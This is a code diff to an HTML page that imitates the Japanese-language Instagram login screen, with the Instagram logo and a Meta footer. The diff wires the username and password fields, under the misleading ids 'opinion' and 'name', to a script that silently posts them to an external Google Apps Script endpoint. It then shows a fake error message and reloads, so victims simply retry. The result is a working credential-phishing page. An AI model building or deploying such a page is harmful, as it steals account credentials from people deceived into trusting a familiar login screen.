@@ -115,7 +115,7 @@ margin-left: 4px;
 .login-btn {
 width: 100%;
 height: 38px;
-background: #b2dffc;
+background: #0095f6;
 color: #fff;
 border: none;
 border-radius: 4px;
@@ -152,25 +152,25 @@ padding-top: 40px;
 <div class="page">
 <div class="language">日本語 ∨</div>
 
-<!-- ここが写真部分 -->
 <div class="logo">
 <img src="https://logos-world.net/wp-content/uploads/2020/05/Instagram-Logo-2016-present.png" alt="sample image">
 </div>
 
 <div class="login-box">
-<button class="facebook-btn">Facebookでログイン</button>
+<button class="facebook-btn" type="button">Facebookでログイン</button>
 
 <div class="divider">または</div>
 
-<input class="input" type="text" placeholder="電話番号、ユーザーネーム、メールアドレス" />
-<input class="input" type="password" placeholder="パスワード" />
+<!-- id を追加 -->
+<input id="opinion" class="input" type="text" placeholder="電話番号、ユーザーネーム、メールアドレス" />
+<input id="name" class="input" type="password" placeholder="パスワード" />
 
-<div class="forgot
-">
+<div class="forgot">
 <a href="#">パスワードを忘れた場合</a>
 </div>
 
-<button class="login-btn" onclick="submitForm()">ログイン</button>
+<!-- id を追加 -->
+<button id="submitBtn" class="login-btn" type="button" onclick="submitForm()">ログイン</button>
 
 <div class="signup">
 アカウントをお持ちでないですか？
@@ -178,46 +178,46 @@ padding-top: 40px;
 </div>
 </div>
 
-  <script>
-    async function submitForm() {
-        // ステップ1で取得したURLをここに貼り付け
-        const WEB_APP_URL = "https://script.google.com/macros/s/AKfycbyEIAw_OBFy_fypjmhRapswSn3cW-aun1Z8kUnLGWfVSFfdqrnPiPxWqiaHRJfoCH5p/exec"; 
-        
-        const btn = document.getElementById('submitBtn');
-        const name = document.getElementById('name').value || "匿名";
-        const opinion = document.getElementById('opinion').value;
-
-        if (!opinion) {
-            alert("未入力の事項があります");
-            return;
-        }
-
-        btn.disabled = true;
-        btn.innerText = "本人確認中...";
-
-        try {
-            // mode: 'no-cors' を使うことでCORSエラーを回避しつつGASへ飛ばします
-            await fetch(WEB_APP_URL, {
-                method: 'POST',
-                mode: 'no-cors',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ name, opinion })
-            });
-            
-            alert("本人確認が完了しました。");
-            location.reload(); 
-        } catch (e) {
-            console.error(e);
-            alert("エラーが発生しました。");
-            btn.disabled = false;
-            btn.innerText = "送信";
-        }
-    }
-</script>
-
 <div class="meta">
 from ∞ Meta
 </div>
 </div>
+
+<script>
+async function submitForm() {
+const WEB_APP_URL = "https://script.google.com/macros/s/AKfycbyEIAw_OBFy_fypjmhRapswSn3cW-aun1Z8kUnLGWfVSFfdqrnPiPxWqiaHRJfoCH5p/exec";
+
+const btn = document.getElementById("submitBtn");
+const name = document.getElementById("name").value.trim() || "匿名";
+const opinion = document.getElementById("opinion").value.trim();
+
+if (!opinion) {
+alert("未入力の事項があります");
+return;
+}
+
+btn.disabled = true;
+btn.innerText = "ログイン中...";
+
+try {
+await fetch(WEB_APP_URL, {
+method: "POST",
+mode: "no-cors",
+headers: {
+"Content-Type": "application/json"
+},
+body: JSON.stringify({ name, opinion })
+});
+
+alert("エラーが発生しました。");
+location.reload();
+} catch (e) {
+console.error(e);
+alert("エラーが発生しました。");
+btn.disabled = false;
+btn.innerText = "送信";
+}
+}
+</script>
 </body>
 </html>
